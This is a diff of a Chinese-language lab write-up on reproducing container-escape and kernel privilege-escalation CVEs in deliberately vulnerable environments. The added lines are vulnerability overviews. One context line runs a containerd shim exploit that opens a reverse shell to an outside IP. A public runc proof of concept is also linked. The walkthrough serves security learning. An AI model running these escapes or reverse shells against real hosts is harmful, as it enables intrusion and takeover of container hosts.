@@ -14,7 +14,11 @@ root@VM-8-3-ubuntu:~/metarget# pip3 install -r requirements.txt
 
 
 
-## 1.	cve-2018-15664 容器逃逸
+## 1.	cve-2018-15664 ：Docker CP任意读写主机文件 （容器逃逸）
+
+漏洞概述：
+
+2019年6月份，Docker容器被曝存在权限逃逸安全漏洞(漏洞编号:CVE-2018-15664)，攻击者可利用此漏洞访问主机文件系统的任意文件，该漏洞攻击的基本前提是FllowSymlinkInScope遭受了最基本的TOCTOU攻击(即time-to-check-time-to-use攻击，黑客可利用窗口期在解析资源路径之后但在分配的程序开始在资源上操作之前修改路径)，这里的FllowSymlinkInScope的目的是获取一个既定路径并以安全的方式将其解析，就像该进程是在容器内那样,完整路径被解析后被解析的路径传递了一个比特位，之后在另外一个比特位上操作(在docker cp情况下，在创建流式传输到客户端的文档时打开)，如果攻击者能够在路径解析之后但在操作之前添加一个符号链接组件，那么就能以root身份在主机上解析符号链接路径组件，在"Docker cp"情况下它将导致任何人读取并写入主机任何路径的访问权限。
 
 安装启动环境，查看版本
 
@@ -52,7 +56,11 @@ SUCCESS -- HOST FILE CHANGED
 即可触发漏洞，完成复现
 
 
-## 2. cve-2020-15257 容器逃逸
+## 2. cve-2020-15257 （容器逃逸）
+
+漏洞概述：
+
+2020年12月01日，Containerd 官方发布安全更新，修复了 Docker 容器逃逸漏洞（CVE-2020-15257）。 Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸。Containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。
 
 安装漏洞环境root@VM-8-3-ubuntu:~/metarget# sudo ./metarget cnv install cve-2020-15257
 
@@ -93,7 +101,15 @@ root@VM-8-3-ubuntu:/# ./cdk_linux_amd64 run shim-pwn reverse 43.138.22.133 80
 ![image](https://github.com/user-attachments/assets/3ef7cb7c-c7ca-4ac2-8cf0-5dd0e1a9670a)
 
 
-## 3.	cve-2019-5736 容器逃逸
+## 3.	cve-2019-5736 (runc容器逃逸)
+
+漏洞概述：
+
+2019年2月11日，runC的维护团队报告了一个新发现的漏洞，SUSE Linux GmbH高级软件工程师Aleksa Sarai公布了影响Docker, containerd, Podman, CRI-O等默认运行时容器runc的严重漏洞CVE-2019-5736。
+
+漏洞会对IT运行环境带来威胁，漏洞利用会触发容器逃逸、影响整个容器主机的安全，最终导致运行在该主机上的其他容器被入侵。漏洞影响AWS, Google Cloud等主流云平台。
+
+攻击者可以通过特定的容器镜像或者exec操作可以获取到宿主机的runC执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。
 
 安装环境
 
@@ -136,7 +152,11 @@ https://github.com/Frichetten/CVE-2019-5736-PoC
 
 
 
-## 4.	cve-2022-0847 （脏牛）内核权限提升
+## 4.	cve-2022-0847 ：Dirty Pipe （内核权限提升）
+
+漏洞概述：
+
+CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 是存在于 Linux内核 5.8 及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为"Dirty Pipe"。
 
 环境安装
 
@@ -194,7 +214,7 @@ root@VM-8-3-ubuntu:~# docker exec -it terraformgoat_tencentcloud_0.0.7 /bin/bash
 
 部署完成
 
-## 1.对象遍历
+## 1.Bucket 对象遍历
 
 cd /TerraformGoat/tencentcloud/cos/bucket_object_traversal/
 
